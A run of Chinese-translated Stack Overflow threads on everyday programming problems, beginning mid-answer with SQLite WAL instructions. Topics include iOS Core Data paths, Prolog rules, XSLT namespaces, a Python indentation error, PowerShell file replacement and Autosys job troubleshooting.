  NSLog(@"\n\n\n ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ NOTE ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~\n");
  NSLog(@"In your terminal run the following commands to merge wal file. Otherwise you may see partial or no data in %@ file", sqliteFileName);
  NSLog(@"\n-------------------------------------------------");
  NSLog(@"$ cd %@", destDir.path);
  NSLog(@"$ sqlite3 %@", sqliteFileName);
  NSLog(@"sqlite> PRAGMA wal_checkpoint;");
  NSLog(@"-------------------------------------------------\n");
  NSLog(@"Press control + d");
} 
```

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2018-05-03T12:10:22.750

只需添加 viewDidLoad：

```
debugPrint(FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)) 
```

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2021-02-10T22:35:49.460

`print("Documents Directory: ", FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).last ?? "Not Found!")`

请将此行添加到 AppDelegate 的 applicationDidFinishLaunching 中。它将为我们提供文档的路径。但核心数据数据库`./Library/Application Support/`同名`projectname.sqlite`。

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2022-02-01T06:02:43.900

打开 Mac OS 终端并键入以下命令

```
xcrun simctl get_app_container booted com.ondevtratech.PlannerCoreData

xcrun simctl get_app_container booted <bundle <>identifier> 
```

打开数据库：

brew install --cask db-browser-for-sqlite

打开 << 应用路径：sql lite.app >> <<.sqlite 数据库路径>>

例如： open -a /Applications/DB\ Browser\ for\ SQLite.app /DTMPlanner.sqlite

# java - Android Java.util.Arrays 类

> ID：10239636
> 
> 赞同：1
> 
> 时间：2012-04-20T02:56:12.227
> 
> 标签：java, android, arrays

这可能是一个答案非常明显的问题。我只是看不到它，当有人清楚地向我指出时，我可能会感到非常渺小。

我在 Eclair MR1 级别使用 Android，所以我的 Android Manifest 有：

```
<uses-sdk android:minSdkVersion="7" /> 
```

在我的 MainActivity 中，我有一个 byte[] 我想重新分配到更大的大小。

Java SE 6 的 java.util.Arrays 类具有静态方法，可以为每种基本类型执行此操作。[我可以在http://developer.android.com/reference/java/util/Arrays.html#copyOf%28byte[],%20int%29](http://developer.android.com/reference/java/util/Arrays.html#copyOf%28byte%5B%5D,%20int%29)的 android 文档中看到该类

这是我的代码：

```
 byte [] padToLength (byte[] plain) {

    try{
        byte[] plainpad2 = java.util.Arrays.copyOf(plain, plain.length+10);  //why won't this compile?
    } catch (Exception e) {

    } 
```

但是当我使用它时，我在 Eclipse 中得到一个编译错误，说“方法 copyOf(byte[], int) 未定义类型数组。

谁能建议我做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T03:04:06.853

`Arrays.copyOf(byte[], int)`没有为 API 级别 7 定义。在您提供的链接中，查看右上角，您会看到一个显示“按 API 级别过滤”的复选框。选择`7`删除该方法。

你为什么要使用数组呢？`ArrayList`在 Java 中，除非遇到性能问题，否则几乎应该一直使用。在这种情况下，您根本不必担心数组的大小。如果您的函数必须接受`byte[]`参数，那么我建议调用类似`List<Byte> myList = Arrays.asList(plain)`.

# java - XSLT for XML 包含多个名称空间

> ID：10239656
> 
> 赞同：2
> 
> 时间：2012-04-20T02:59:01.977
> 
> 标签：java, xml, xslt

我正在研究一个让我有点头疼的 XSLT，并且正在寻找一些技巧。我正在转换一个 XML，其中一些标签具有命名空间前缀，而另一些则没有。我正在努力将所有标签转换为一个通用的命名空间前缀。

XML 示例：

```
<yes:Books>
   <no:Book>
      <Title>Yes</Title>
      <maybe:Version>1</maybe:Version>
   </no:Book>
</yes:Books> 
```

我想要得到什么：

```
<yes:Books>
   <yes:Book>
      <yes:Title>Yes</yes:Title>
      <yes:Version>1</yes:Version>
   </yes:Book>
</yes:Books> 
```

XML 输入是几个 web 服务的集合，它们返回不同的命名空间。我没有问题将它适当地聚合在一起，它正在创建一个我遇到问题的公共前缀命名空间。

最坏的情况，我可以将它们正则表达式去掉，但我确定不推荐这样做。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T04:11:22.337

**此转换允许将所需的最终前缀及其命名空间指定为外部/全局参数。它显示了如何以相同的方式处理属性名称**：

```
<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:param name="pPrefix" select="'yes'"/>
 <xsl:param name="pNamespace" select="'yes'"/>

 <xsl:template match="*">
  <xsl:element name="{$pPrefix}:{local-name()}" namespace="{$pNamespace}">
   <xsl:apply-templates select="node()|@*"/>
  </xsl:element>
 </xsl:template>

 <xsl:template match="@*">
  <xsl:attribute name="{$pPrefix}:{local-name()}" namespace="{$pNamespace}">
   <xsl:value-of select="."/>
  </xsl:attribute>
 </xsl:template>
</xsl:stylesheet> 
```

**当应用于以下文档时**（提供的带有一个添加属性的文档以使问题更具挑战性）：

```
<yes:Books xmlns:yes="yes">
    <no:Book xmlns:no="no">
        <Title no:Major="true">Yes</Title>
        <maybe:Version xmlns:maybe="maybe">1</maybe:Version>
    </no:Book>
</yes:Books> 
```

**产生想要的正确结果：**

```
<yes:Books xmlns:yes="yes">
   <yes:Book>
      <yes:Title yes:Major="true">Yes</yes:Title>
      <yes:Version>1</yes:Version>
   </yes:Book>
</yes:Books> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T03:20:50.653

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:custom="c">
    <xsl:template match="/">
        <xsl:copy>
            <xsl:apply-templates select="node()|@*"/>
        </xsl:copy>
    </xsl:template>
    <xsl:template match="*">
        <xsl:element name="custom:{local-name()}" namespace-uri="c">
            <xsl:apply-templates/>
        </xsl:element>
    </xsl:template>
</xsl:stylesheet> 
```

# c# - 有没有办法“新建”一个对齐到 64 字节的 .NET 对象？

> ID：10239659
> 
> 赞同：3
> 
> 时间：2012-04-20T02:59:35.523
> 
> 标签：c#, memory-alignment

有类似[`_aligned_malloc`](http://msdn.microsoft.com/en-us/library/8z34s9c6%28v=vs.100%29.aspx)C 和 C++ 的函数，但我找不到任何用于对齐内存中的 .NET 对象的东西。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T00:27:43.577

在一般情况下，不可能在 64 位边界上有效地对齐 .net 对象，因为即使对象从 64 位边界开始，也不能保证它不会重新定位到 64 位边界的奇数倍32 位。出于某种原因，.net 似乎认为将超过一千个`double`值的数组强制到大对象堆是值得的，它总是 64 位对齐但在其他方面很糟糕，但没有提供请求 64 位对齐的有用方法对于其他对象，即使这样做应该不困难或成本高（在 gen0 中四舍五入对象大小；当将对象移动到更高编号的代时，将奇数大小的对象配对）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T04:03:54.437

更正——您需要创建一个 P/Invocable DLL，然后调用它来执行对齐的 malloc 函数。示例 C++ 代码

```
 #include <malloc.h>

extern "C" {
__declspec(dllexport) void* alMlc(size_t size, size_t alginment) {
    return _aligned_malloc(size,alginment);
}
} 

```

C# 代码（假设您创建的 DLL 名为 mallocer.dll）

```
 using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

namespace ConsoleApplication7
{
    class Program
    {
        [DllImport("mallocer.dll", CallingConvention=CallingConvention.Cdecl)]
        static extern IntPtr alMlc(int size, int alignment);
        static void Main(string[] args)
        {
            unsafe
            {
                //Allocate exactly 64 bytes of unmanaged memory, aligned at 64 bytes
                char* str = (char*)alMlc(64,64).ToPointer();
                str[0] = 'H';
                str[1] = 'i';
                str[2] = '!';
                str[3] = '\0';

                Console.WriteLine(System.Runtime.InteropServices.Marshal.PtrToStringAuto(new IntPtr(str)));

            }
            Console.ReadKey();
        }
    }
} 

```

# c# - 可以从另一个类中公开 Web 引用吗？

> ID：10239661
> 
> 赞同：3
> 
> 时间：2012-04-20T02:59:42.143
> 
> 标签：c#, web-services, asmx

问题很简单。。

我们通常使用 Web 引用从字面上使用 Web 服务（Visual Studio）。但是，我的问题是另一种方式。我需要从 ac# 类调用特定的 Web 服务，以使该 Web 服务可供其他人使用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T03:15:38.047

首先，如果您可以选择，您应该在服务器和客户端上都使用 WCF。如果由于某种原因您不能在服务器上使用它，那么至少通过使用“添加服务引用”而不是“添加 Web 引用”在客户端上使用它。“添加 Web 引用”是传统 ASMX 技术的一部分，不应将其用于新开发。

其次，当然您可以创建一个单独的类库，并在该库中使用“添加服务引用”。然后，您可以编写一个具有调用服务的公共方法的类。这个类库的用户会调用你的公共方法，不会直接调用服务。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T07:56:08.750

您可以通过在 VS 中展开 Web 引用来提取 Web 引用的 C# 代码类（如果我没记错的话，可以显示隐藏文件）。您应该找到一个 Reference.cs 文件，它是您的 Web 服务的代理客户端代码。

它包含调用 WS 所需的一切。您可以将其复制到其他地方，将其包含在另一个项目中，更改其名称空间/代码等。从长远来看，如果相应的 WS 发展，维护此文件将是一件痛苦的事。

无论如何，如果你有选择，你应该遵循@JohnSaunders 关于 WCF 的建议

# prolog - 列表 Prolog 列表中的组合

> ID：10239662
> 
> 赞同：2
> 
> 时间：2012-04-20T02:59:49.210
> 
> 标签：prolog, combinations

我需要在列表列表中找到组合。例如给出以下列表，

列表 = [[1, 2], [1, 2, 3]]

这些应该是输出，

梳 = [[1,1],[1,2],[1,3],[2,1],[2,2],[2,3]]

另一个例子：

列表 = [[1,2],[1,2],[1,2,3]]

梳 = [[1,1,1],[1,1,2],[1,1,3],[1,2,1],[1,2,2],[1,2,3] ....ETC]

我知道如何为具有两个子列表的列表执行此操作，但它需要适用于任意数量的子列表。

我是prolog的新手，请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T09:21:13.617

```
try([],[]).
try([L|Ls],[M|Ms]):-
    member(M,L),
    try(Ls,Ms).

all(L,All) :- findall(M, try(L,M), All). 
```

try 返回一个由第一个参数的子列表的元素组成的列表。all 查找所有此类列表。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T09:15:25.740

作为一个新的 prolog 程序员，这是你的答案，简单明了。

```
%elementInList(input list, output answer)
answer(ListOfList, AnswerInList) :-
    findall(Ans, combList(ListOfList, Ans), AnswerInList).

%combList(ListOfList, Comb) :-
combList([], []).

combList([Head|Tail], Comb) :-
    combList(Tail, [Element|Tempcomb]),
    elementInList(Head, Element).

%elementInList(List, Element)
elementInList([Head|_], Head).

elementInList([Head|Tail], Element) :-
    elementInList(Tail, Element). 
```

使用定义 answer(InputList, OutputResult)，例如

```
answer([[1,2],[7,8]],Comb).
Comb = [[1, 7], [2, 7], [1, 8], [2, 8]]. 
```

例如

```
answer([[1,2],[2,8],[3,6,9]],Comb).
Comb = [[1, 2, 3], [2, 2, 3], [1, 8, 3], [2, 8, 3], [1, 2, 6], [2, 2, 6], [1, 8|...], [2|...], [...|...]|...]. 
```

对于任意数量的子列表，依此类推 [X,Y,Z,..]。别客气。

# html - CSS 两个相邻的按钮，一个在表单中，一个不在

> ID：10239663
> 
> 赞同：0
> 
> 时间：2012-04-20T03:00:05.757
> 
> 标签：html, css

有没有办法让这两个按钮并排排列。表单的末尾会自动抛出一个新行。

```
<form>
....
<button id="regSubmit" class="sbutton"><span class="register">SIGN UP</span></button>
</form>
<button id="regReset" class="sbutton"><span class="reset">RESET FIELDS</span></button> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T03:02:14.170

困难重重，也许吧。

最简单的方法是添加：

```
onClick="return false;" 
```

到第二个按钮。虽然，从外观上看，它应该是表单的重置按钮？不是`<input type="reset" />`更合适吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T03:05:03.337

如果您真的不能在表单中拥有 regReset 按钮，可以尝试将 regReset 按钮隐藏在表单之外，并在表单内有一个按钮在 javascript 中单击它：

```
<form>
....
<button id="regSubmit" class="sbutton"><span class="register">SIGN UP</span></button>
<button id="regResetBtnClicker" onclick="document.getElementById('regReset').click();" class="sbutton"><span class="reset">RESET FIELDS</span></button>
</form>
<button id="regReset" style="display: none;" class="sbutton"><span class="reset">RESET FIELDS</span></button> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T03:06:16.053

尝试通过添加 css 规则将第二个按钮浮动到右侧：

```
#regReset { float: right} 
```

或者只是通过向按钮本身添加样式：

```
<button style="float: right" id="regReset" class="sbutton"><span class="reset">RESET FIELDS</span></button> 
```

# javascript - jquery mobile中的小部件未加载

> ID：10239666
> 
> 赞同：0
> 
> 时间：2012-04-20T03:00:35.447
> 
> 标签：javascript, jquery-mobile, backbone.js, requirejs, underscore.js

我正在为我的项目使用主干、require.js、下划线和 jquery mobile。我注意到 jquery mobile 中的一些小部件主要没有加载页眉和页脚。我该如何解决？

# 更新

我的 html

```
<div id="connectionForm">
<div data-role="header" data-position="inline">
    <a data-icon="delete">Cancel</a>
    <h1>Edit Contact</h1>
    <a data-icon="check">Save</a>
</div>
<input class="user-input" id="serviceUrl"/>
<a class="save-url btn" data-role="button" data-icon="check">Save</a> 
```

在萤火虫上

```
<div class="ui-[object Object]" data-position="inline" data-role="header"> 
```

在视图上加载 jquery mobile 和东西

```
define([
'jquery',
'mobile',
'const',
'underscore',
'backbone',
],function($, Mobile, Const,  _, Backbone){ 
```

这是它加载的小部件列表（使用 firebug）

```
button
function()

checkboxradio
function()

collapsible
function()

collapsibleset
function()

dialog
function()

listview
function()

navbar
function()

page
function()

selectmenu
function()

slider
function()

textinput
function()

widget 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T03:12:50.177

*编辑*没关系，您的更新显示您已经在使用 data-role="header"

JQuery Mobile 使用标签

```
<div data-role="header"></div> 
```

定义标题部分，而不是下面更常见的用法

```
<div class="header"></div>
<header></header> (html5) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T03:43:23.773

解决了。默认情况下，jqm 不会加载标题小部件或在 firebug 的 DOM 选项卡上显示它。所以我更新到 1.1.0 版本，一切都像魅力一样。

# python - IndentationError：意外的缩进为什么？

> ID：10239668
> 
> 赞同：38
> 
> 时间：2012-04-20T03:00:45.227
> 
> 标签：python, indentation

IndentationError: 意外的 unindent 为什么？？？

```
#!/usr/bin/python
import sys
class Seq:
    def __init__(self, id, adnseq, colen):
        self.id     = id
        self.dna    = adnseq
        self.cdnlen = colen
        self.prot   = ""
    def __str__(self):
        return ">%s\n%s\n" % (self.id, self.prot)
    def translate(self, transtable):
        self.prot = ""
        for i in range(0,len(self.dna),self.cdnlen):
            codon = self.dna[i:i+self.cdnlen]
            aa    = transtable[codon]
            self.prot += aa
    def parseCommandOptions(cmdargs):
        tfname = cmdargs[1]
        sfname = cmdargs[2]
        return (tfname, sfname)
    def readTTable(fname):
        try:
            ttable = {}
            cdnlen = -1
            tfile = open(fname, "r")
            for line in tfile:
                linearr = line.split()
                codon   = linearr[0]
                cdnlen  = len(codon)
                aa      = linearr[1]
                ttable[codon] = aa
            tfile.close()
            return (ttable, cdnlen)
    def translateSData(sfname, cdnlen, ttable):
        try: 
            sequences = []
            seqf = open(seq_fname, "r")
            line = seqf.readline()
            while line:
                if line[0] == ">":
                    id = line[1:len(line)].strip()
                    seq = ""
                    line = seqf.readline()
                    while line and line[0] != '>':
                        seq += line.strip()
                        line = seqf.readline()  
                    sequence = Seq(id, seq, cdnlen)
                    sequence.translate(ttable)
                    sequences.append(sequence)
            seqf.close()
            return sequences    
    if __name__ == "__main__":
        (trans_table_fname, seq_fname) = parseCommandOptions(sys.argv)
        (transtable, colen) = readTTable(trans_table_fname)
        seqs = translateSData(seq_fname, colen, transtable)
        for s in seqs:
            print s 
```

它说：

```
 def translateSeqData(sfname, cdnlen, ttable):
   ^
IndentationError: unexpected unindent 
```

为什么？我检查了数千次，我找不到问题所在。我只使用了制表符，没有空格。另外，有时它会要求定义类。那样可以么？

* * *

## 回答 #1

> 赞同：99
> 
> 时间：2012-04-20T03:01:57.393

这是因为你有：

```
def readTTable(fname):
    try: 
```

`except`块后没有匹配`try:`块。每个`try`必须至少有一个匹配项`except`。

请参阅 Python 教程的[错误和异常](http://docs.python.org/tutorial/errors.html)部分。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-04-20T03:02:43.680

你没有完成你的`try`陈述。你也需要并且`except`在那里。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-10T16:02:28.133

此错误实际上可能在报告错误的代码中。请参阅例如，如果您有如下语法错误，您将收到缩进错误。语法错误实际上在“except”旁边，因为它后面应该包含一个“:”。

```
try:
    #do something
except
    print 'error/exception'

def printError(e):
    print e 
```

如果将上面的“except”更改为“except:”，错误就会消失。

祝你好运。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-09-10T21:22:21.550

@MaxPython 下面的答案缺少语法`":"`

```
 try:
       #do something
    except:
      # print 'error/exception'

    def printError(e):
        print e 
```

# mysql - 使用mysql++连接mysql失败

> ID：10239678
> 
> 赞同：0
> 
> 时间：2012-04-20T03:02:00.123
> 
> 标签：mysql, sql, connection, mysql++

我的调用代码如下

```
bool suc = conn.connect("mydb", "localhost", "root", "");
if (suc)
{
cout << "success" << endl;
}
else
{
cout << "fail " << conn.error() << endl;
} 
```

并且 mysql 服务器正在运行，但程序失败说 Can't connect to local MySQL server through socket '/tmp/mysql.sock' (111)

有没有人遇到过这样的问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-09T22:21:45.453

Mysql 配置文件可能位于 /etc/my.cnf

如果 Mysql 正在运行，查看日志可能会有所帮助，它应该位于 /var/log/

命名为：
mysql.log
mysql.err
mysqld.log
mysqld.err

```
$ ls -l /var/log/
// when you have the name try
$ tail -n 50 /var/log/LogName 
```

# prolog - Prolog 程序中存在异常

> ID：10239685
> 
> 赞同：1
> 
> 时间：2012-04-20T03:03:07.597
> 
> 标签：prolog

我正在尝试在我的序言程序中编写一条规则，以确定某人是否是其他人的兄弟。

例如，如果我输入brother_of(chris, X) 它将返回christy，因为chris 是christy 的兄弟。但是，当我输入这个时，我得到一个存在异常。我已经包含了涵盖所有内容的事实，但也许这是我的规则定义中的问题？代码如下。

```
/* Facts */
female(ella).
female(jodi). 
female(sonya).
female(jane). 
female(christy). 
female(mary).
male(arnold).
male(chris).
male(louis).
male(mark).  
father(arnold).
father(louis).
father(mark).
mother(ella).
mother(jodi).
mother(jane).
mother(mary).
father_of(arnold, chris). /* arnold is the father of chris */
father_of(arnold, christy).
father_of(louis, mark).
father_of(mark, arnold). 
mother_of(mary, chris).
mother_of(mary, christy).          
mother_of(jane, arnold).    
mother_of(ella, sonya).
mother_of(jodi, ella).
mother_of(jodi, mark).

/* Rules */

brother_of(X, Y) :-
    male(X),
    ((father_of(Z, X), father_of(Z, Y));
    (mother_of(W, X), mother_of(W, Y))),
    X =\= Y. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T03:07:22.837

运算符`=\=`仅用于算术（AFAIK），要查看两个术语是否不同（不可统一），请使用运算符`\=`：

```
X \= Y. 
```

**更新：对**[cut](http://en.wikipedia.org/wiki/Cut_%28logic_programming%29) ( ) 目标的简要介绍`!`：当在谓词中使用 cut 时，意味着除了已经找到的答案之外不应再搜索答案（即您正在搜索树中“切割剩余的分支”）。例子：

```
first_child(X,Y) :-
    father_of(X,Y), !.

?- first_child(arnold,Y).

Y = chris ;

no 
```

到达剪切后，剪切**之前**的所有选择点都将被丢弃（但可以在它之后创建新的选择点）。在您的示例中，您知道如果 X 和 Y 有同一个父亲，那么他们是否也有同一个母亲是无关紧要的。因此，您可以在“共同父亲”部分成功后立即进行切割：

```
brother_of(X, Y) :-
    male(X),
    ((father_of(Z, X), father_of(Z, Y), X \= Y, !); # If cut is reached, will not run the next line
    (mother_of(W, X), mother_of(W, Y), X \= Y)). 
```

但是请注意，使用 cut 有很多陷阱（请参阅链接的 Wikipedia 文章中的“green cut”与“red cut”），但这里描述的太多了。（注意我是如何重复`X \= Y`的——如果我不这样做，程序有时会失败）

最后，我还想指出，`;`在编写 Prolog 代码时通常不鼓励使用 using（不过，您可以在需要时使用）。相反，将其写在两个子句中：

```
brother_of(X, Y) :-
    male(X),
    father_of(Z, X),
    father_of(Z, Y), 
    X \= Y,
    !.
brother_of(X, Y) :-
    male(X),
    mother_of(W, X),
    mother_of(W, Y), 
    X \= Y. 
```

（`;`不过，这与两个子句有点主观，所以我不会对此进行太多争论......只要知道两种方式都是可能的，并且会产生相同的结果）

# android - 在 Android 上的 Google 地图中移动标记

> ID：10239688
> 
> 赞同：0
> 
> 时间：2012-04-20T03:03:33.640
> 
> 标签：android, google-maps

我正在尝试创建类似于[http://dev.syskall.com/map/的东西](http://dev.syskall.com/map/)

在我的安卓手机应用程序中。基本上我有一个地理点列表，我需要根据地理点的值使汽车/标记在地图上移动。将 mapView 代码放在一个循环中根本没有帮助！地图在到达列表中的最后一个位置之前无效，然后仅显示最新位置，因此我看不到标记的任何移动。

如果有人在 android 上创建了这个 - 请回复我！非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T03:19:52.883

对于这种情况，您不能使用 for 循环或任何其他循环，因为它会在几秒钟内执行，并且点会在几秒钟内移动，因此无法观察到移动。为了观察您的情况下的运动，请使用每 200 毫秒触发一次的计时器。以便您可以观察地图中的运动。随着时间的减少，例如 100 毫秒，您可以更清楚地观察到它。

# r - 无需任何手册和信息（黑盒）即可了解软件包中可用的功能和数据集

> ID：10239696
> 
> 赞同：4
> 
> 时间：2012-04-20T03:04:58.363
> 
> 标签：r, function, load, installation, package

我有一个测试版的软件包，我没有手册，帮助页面也没有手册。

使用以下命令，我可以说包是在当前会话中加载的。

```
(.packages()) 
```

当我搜索

```
data() 
```

我看不到任何相关的数据。这是否意味着没有与之关联的数据集？我怎么知道是否有任何功能？

```
function() # do not work. 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-20T03:42:44.930

列出所有的东西，

`ls("package:MASS", all = TRUE)`

`all = TRUE`显示隐藏对象（即以“.”开头的变量名）

用形式列出所有函数，

`lsf.str("package:MASS", all = TRUE)`

列出所有具有简要说明的数据集

`data(package = "MASS")$results`

以防万一，列出命名空间的所有导入和导出，

`getNamespaceInfo("MASS", "imports")`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T03:43:04.790

从 ?data 的帮助页面

```
try(data(package = "rpart") ) # list the data sets in the rpart package 
```

这也是不推荐使用“数据”名称的原因之一。

```
try(fortunes::fortune("dog") ) 
```

# file - PowerShell：设置内容与“文件已在使用”有问题

> ID：10239702
> 
> 赞同：5
> 
> 时间：2012-04-20T03:06:10.420
> 
> 标签：file, powershell, scripting, replace, locking

我正在开发一个 PowerShell 脚本，该脚本在给定的 DIRECTORY 中查找所有带有 PATTERN 的文件，打印出突出显示 PATTERN 的文档的相关行，然后用提供的 REPLACE 字替换 PATTERN，然后将文件保存回来。所以它实际上编辑了文件。

除了我不能让它改变文件，因为 Windows 抱怨文件已经打开。我尝试了几种方法来解决这个问题，但一直遇到这个问题。也许有人可以提供帮助：

```
param(
    [string] $pattern = ""
    ,[string] $replace = ""
    ,[string] $directory ="."
    ,[switch] $recurse = $false
    ,[switch] $caseSensitive = $false)

if($pattern -eq $null -or $pattern -eq "")
{
    Write-Error "Please provide a search pattern." ; return
}

if($directory -eq $null -or $directory -eq "")
{
    Write-Error "Please provide a directory." ; return
}

if($replace -eq $null -or $replace -eq "")
{
    Write-Error "Please provide a string to replace." ; return
}

$regexPattern = $pattern
if($caseSensitive -eq $false) { $regexPattern = "(?i)$regexPattern" }
$regex = New-Object System.Text.RegularExpressions.Regex $regexPattern

function Write-HostAndHighlightPattern([string] $inputText)
{
    $index = 0
    $length = $inputText.Length
    while($index -lt $length)
    {
        $match = $regex.Match($inputText, $index)
        if($match.Success -and $match.Length -gt 0)
        {
            Write-Host $inputText.SubString($index, $match.Index) -nonewline
            Write-Host $match.Value.ToString() -ForegroundColor Red -nonewline
            $index = $match.Index + $match.Length
        }
        else
        {
            Write-Host $inputText.SubString($index) -nonewline
            $index = $inputText.Length
        }
    }
}

Get-ChildItem $directory -recurse:$recurse |
    Select-String -caseSensitive:$caseSensitive -pattern:$pattern |    
    foreach {
        $file = ($directory + $_.FileName)
        Write-Host "$($_.FileName)($($_.LineNumber)): " -nonewline
        Write-HostAndHighlightPattern $_.Line
        %{ Set-Content $file ((Get-Content $file) -replace ([Regex]::Escape("[$pattern]")),"[$replace]")}
        Write-Host "`n"
        Write-Host "Processed: $($file)"
    } 
```

问题位于最后的代码块中，就在 Get-ChildItem 调用处。当然，由于我试图解决问题然后停止，该块中的一些代码现在有点损坏，但请记住脚本那部分的意图。我想获取内容，替换单词，然后将更改后的文本保存回我从中获取的文件。

任何帮助都将不胜感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-20T06:08:36.640

删除了我之前的答案，将其替换为：

```
Get-ChildItem $directory -recurse:$recurse
foreach {        
    $file = ($directory + $_.FileName)

    (Get-Content $file) | Foreach-object {
        $_ -replace ([Regex]::Escape("[$pattern]")),"[$replace]")
    } | Set-Content $file
} 
```

笔记：

*   括号周围`Get-Content`是为了确保文件被一口气吞掉（并因此关闭）。
*   到后续命令的管道而不是内联。
*   您的一些命令已被删除，以确保它是一个简单的测试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T18:52:42.197

好吧，我终于坐下来，在 PowerShell 中按顺序输入所有内容，然后用它来制作我的脚本。

其实很简单；

```
$items = Get-ChildItem $directory -recurse:$recurse
$items |
foreach {
    $file = $_.FullName
    $content = get-content $file
    $newContent = $content -replace $pattern, $replace
    Set-Content $file $newcontent
} 
```

感谢您的所有帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T05:01:39.893

只是一个建议，但您可以尝试查看参数代码块的文档。有一种更有效的方法可以确保在需要时输入参数，并在用户不需要时抛出错误消息。

About_throw：[http](http://technet.microsoft.com/en-us/library/dd819510.aspx) ://technet.microsoft.com/en-us/library/dd819510.aspx About_functions_advanced_pa​​rameters ：[http ://technet.microsoft.com/en-us/library/dd347600.aspx](http://technet.microsoft.com/en-us/library/dd347600.aspx)

然后关于一直使用 Write-Host： http: [//powershell.com/cs/blogs/donjones/archive/2012/04/06/2012-scripting-games-commentary-stop-using-write-host.aspx](http://powershell.com/cs/blogs/donjones/archive/2012/04/06/2012-scripting-games-commentary-stop-using-write-host.aspx)

# javascript - javascript:void 是什么意思？

> ID：10239706
> 
> 赞同：-1
> 
> 时间：2012-04-20T03:07:17.350
> 
> 标签：javascript, html

> **可能重复：**
> [“javascript:void(0)”是什么意思？](https://stackoverflow.com/questions/1291942/what-does-javascriptvoid0-mean)

在下面的片段中是什么`javascript:void`意思？当用户单击提供的注销链接时，如何让用户关注该链接`href="javascript:void"`？

```
<a href="javascript:void()" id="logout" onClick="#" ><strong>Logout</strong></a> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T03:12:00.827

`void`是一个接受任何输入并且不返回任何内容的函数。

它通常用于链接以使它们不会去任何地方。有点像有的链接`href="#"`，但不影响浏览器历史记录。几乎总是`onclick`附加一个事件，告诉浏览器实际做什么。在您提供的代码中，onclick 属性不是有效的 JavaScript ...

如果您希望链接实际到达某个地方，只需使用常规的`href`.

```
<a href="logout.php" id="logoug"><strong>Logout</strong></a> 
```

# .net - Autosys 作业保持运行状态

> ID：10239708
> 
> 赞同：0
> 
> 时间：2012-04-20T03:07:23.537
> 
> 标签：.net, autosys

我在 Windows 服务器上有一个 .Net exe，我设置了一个 Autosys 作业来启动该应用程序。当我开始工作时，它只是保持在运行状态，但应用程序永远不会运行。该应用程序大约需要 5 分钟才能运行。它下载一些图像，压缩它们，然后将文件移动到另一台服务器。我可以从 cmd 行成功运行该应用程序。我没有收到任何错误消息，并且工作一直说它正在运行。我是 Autosys 的新手，我正在寻找一些关于如何进行故障排除的建议。谢谢。

正确的框架位于应用程序所针对的服务器上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T15:05:46.917

当 autosys 作业运行时，我会检查 Windows 服务器上的作业日志文件。打开 Autosys 命令提示符并运行 autosyslog -J 以读取日志。检查任何错误消息，特别是运行命令的子进程的 PID。然后检查任务管理器以查看该 PID 是否正在运行。

此外，当作业运行时，执行 autorep -d -J 以获取详细的运行报告并查看是否有任何错误消息？

在 Windows 上对这些问题进行故障排除可能会很痛苦。当您从命令行运行它时，我会怀疑它工作的环境与 Autosys 中的环境不同。您是否以与 Autosys 作业中相同的所有者 ID 运行命令行？如果检查客户端日志没有帮助，接下来我将运行 set 命令记录为作业所有者 ID，将输出保存到文件中，然后创建问题作业的副本，用 set 替换命令并将输出传递到一份文件。然后比较两个文件的差异。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-15T18:05:30.763

当作业卡在启动或运行状态时，这意味着 Autosys 事件处理器与 Windows 远程代理通信并传递了远程代理运行作业的所有信息。但是，该远程代理无法与数据库通信以告知其运行的作业的状态。

您可能想检查 Windows 远程代理是否与数据库连接。这可以通过使用命令“autoping -m WindowsMachineName -D”来识别</p>

例如，以下概述了该问题：-

```
<AutosysCommandPrompt>: autoping -m WindowsMachineName -D

AutoPinging Machine [WindowsMachineName]  AND checking the Remote Agent's DB Access.
  ERROR: AutoPing WAS NOT SUCCESSFUL!

   Remote Agent on WindowsMachineName could not connect to DB: xxxxxxxx.WORLD 
```

